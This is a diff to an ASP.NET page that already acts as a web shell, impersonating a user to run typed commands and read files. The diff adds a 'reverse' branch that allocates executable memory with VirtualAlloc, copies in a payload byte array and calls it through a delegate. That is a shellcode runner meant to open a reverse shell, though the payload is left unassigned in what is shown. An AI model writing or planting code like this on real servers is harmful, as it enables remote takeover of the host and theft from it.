@@ -30,10 +30,17 @@
     [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
     public static extern bool CloseHandle(IntPtr handle);
 
+    [DllImport("kernel32")]
+    static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);
+
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    delegate void WindowsRun();
+
+
     public void Page_Load(Object s, EventArgs e)
     {
 
-    
+
     }
 
     private bool impersonateValidUser(String userName, String domain, String password)
@@ -74,7 +81,7 @@
 
     protected void cmdExecute_Click(object sender, EventArgs e)
     {
-            if(impersonateValidUser(this.txtUserName.Text, ".", this.txtPassword.Text))
+        if(impersonateValidUser(this.txtUserName.Text, ".", this.txtPassword.Text))
         {
             this.litResult.Text = User.Identity.Name + "<br/>";
             string[] command = this.txtCommand.Text.Split(new char[] { ' ' });
@@ -89,6 +96,15 @@
             else if(command[0].Equals("cat"))
             {
                 this.litResult.Text = System.IO.File.ReadAllText(command[1]);
+            }
+            else if (command[1].Equals("reverse"))
+            {
+                byte[] payload;
+                IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);
+                Marshal.Copy(payload, 0, ptr, payload.Length);
+                WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));
+                r();
+
             }
 
             //Insert your code that runs under the security context of a specific user here.
